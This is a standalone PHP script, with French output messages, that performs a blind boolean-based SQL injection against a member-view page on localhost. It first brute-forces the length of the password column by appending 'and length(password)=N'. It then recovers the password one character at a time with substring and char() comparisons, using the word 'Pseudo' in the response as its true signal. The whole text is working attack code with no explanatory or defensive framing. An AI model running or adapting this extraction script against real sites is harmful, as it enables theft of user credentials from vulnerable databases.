<?php
set_time_limit(0);
$url = "http://localhost/index.php?pg=viewmembre&id=1";
$longueur = 0;
$final = '';
for($i=1;$i<=40;$i++) {
    $page = file_get_contents($url . urlencode(" and length(password)=$i"));
    if(preg_match("#Pseudo#", $page)) {
        $longueur = $i;
        break;
    }
}
echo 'Le contenant à pour longueur '.$longueur.' caractères.<br />';
 
$inf = 40;
$sup = 130;
$code = $inf;
$i = 1;
while($i <= $longueur) {
    if ($code == $sup) {
        break;
    }
    $page = file_get_contents($url . urlencode(" and substring(password,$i,1)=char($code)"));
    if (preg_match("#Pseudo#", $page)) {
        echo 'Un caractère a été découvert : '.chr($code).'<br />';
        $final .= chr($code);
        $i++;
        $code = $inf;
    }
    $code++;
}
echo 'Le contenant final est '.$final;
?>